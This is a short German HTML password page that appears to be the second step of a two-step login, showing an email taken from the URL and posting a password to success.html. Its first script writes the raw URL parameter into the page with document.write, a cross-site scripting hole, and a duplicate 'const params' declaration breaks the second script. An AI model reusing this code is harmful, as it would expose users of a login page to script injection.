<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Login - Passwort</title>
  <link rel="stylesheet" href="css/style.css">
</head>
<body>

  <!-- Header Image -->
  <div class="header"></div>

  <!-- Centered Form -->
  <div class="form-box">
    <img src="images/logo-password.png" alt="Logo">

    <!-- Show Email from First Page -->
    <p class="user-email">
      <!-- Display email passed from index.html -->
      <script>
        const params = new URLSearchParams(window.location.search);
        document.write(params.get("email") || "E-Mail-Adresse nicht gefunden");
      </script>
    </p>

    <form action="success.html" method="POST">
  <!-- Display entered email dynamically -->
  <p class="user-email" id="userEmail"></p>

  <label for="password">Passwort</label>
  <input type="password" id="password" name="password" required>

  <p class="info-text">
    Geben Sie Ihr Passwort ein, um fortzufahren
  </p>

  <button type="submit" class="weiter-btn">Weiter</button>
</form>

<script>
  const params = new URLSearchParams(window.location.search);
  const email = params.get("email");
  if (email) {
    document.getElementById("userEmail").textContent = email;
  }
</script>


</body>
</html>
